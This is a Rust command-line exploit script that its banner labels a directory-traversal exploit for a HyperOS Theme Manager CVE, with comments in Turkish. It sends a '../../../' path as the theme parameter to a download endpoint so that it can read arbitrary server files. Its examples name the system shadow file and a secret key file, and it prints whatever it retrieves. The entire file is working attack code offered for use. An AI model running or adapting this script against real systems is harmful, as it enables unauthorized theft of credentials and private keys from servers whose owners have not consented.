use clap::Parser;
use colored::*;
use reqwest::blocking::Client;
use std::time::Duration;
use urlencoding::encode;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Hedef sunucu URL'si (ör. http://127.0.0.1:5000)
    #[arg(short, long)]
    url: String,

    /// Okunmak istenen dosya yolu (ör. etc/shadow veya var/hyperos/secret_key.pem)
    #[arg(short, long)]
    file: String,

    /// Payload'u URL Encode et
    #[arg(short, long, default_value_t = false)]
    encode: bool,
}

fn print_banner() {
    let banner = format!(
        "
{}
{}
{}
    ",
        "===================================================================".cyan().bold(),
        "      CVE-2025-2844: HyperOS Theme Manager Directory Traversal (Rust)".red(),
        "===================================================================".cyan().bold()
    );
    println!("{}", banner);
}

fn main() {
    let args = Args::parse();
    print_banner();

    println!("{} {}", "[*] Hedef URL:".yellow(), args.url);
    println!("{} {}", "[*] Okunacak Dosya:".yellow(), args.file);

    // Temel payload
    let mut payload = format!("../../../{}", args.file);

    if args.encode {
        payload = encode(&payload).into_owned();
        println!("{} {}", "[*] Payload URL Encode edildi:".yellow(), payload);
    }

    let target_url = format!("{}/api/themes/download", args.url);
    
    println!("{} {}?theme={}", "[*] İstek gönderiliyor...".cyan(), target_url, payload);

    let client = Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .expect("Failed to build HTTP client");

    let response = client.get(&target_url)
        .query(&[("theme", &payload)])
        .send();

    match response {
        Ok(resp) => {
            let status = resp.status();
            match resp.text() {
                Ok(text) => {
                    if status.is_success() {
                        println!("\n{}", "[+] Başarılı! Dosya içeriği okundu:".green().bold());
                        println!("{}", text.white());
                        println!("{}", "[+] Zafiyet başarıyla sömürüldü.".green().bold());
                    } else if status.as_u16() == 404 {
                        println!("\n{}", "[-] Dosya bulunamadı (404). Yol yanlış olabilir veya sunucu yamalanmış olabilir.".red());
                        println!("Sunucu Yanıtı: {}", text);
                    } else {
                        println!("\n{} {}", "[-] İstek başarısız oldu. HTTP Kodu:".red(), status);
                        println!("Sunucu Yanıtı: {}", text);
                    }
                }
                Err(e) => println!("\n{} {}", "[!] Yanıt gövdesi okunamadı:".red(), e),
            }
        }
        Err(e) => {
            println!("\n{} {}", "[!] Hata: İstek başarısız oldu:".red(), e);
        }
    }
}
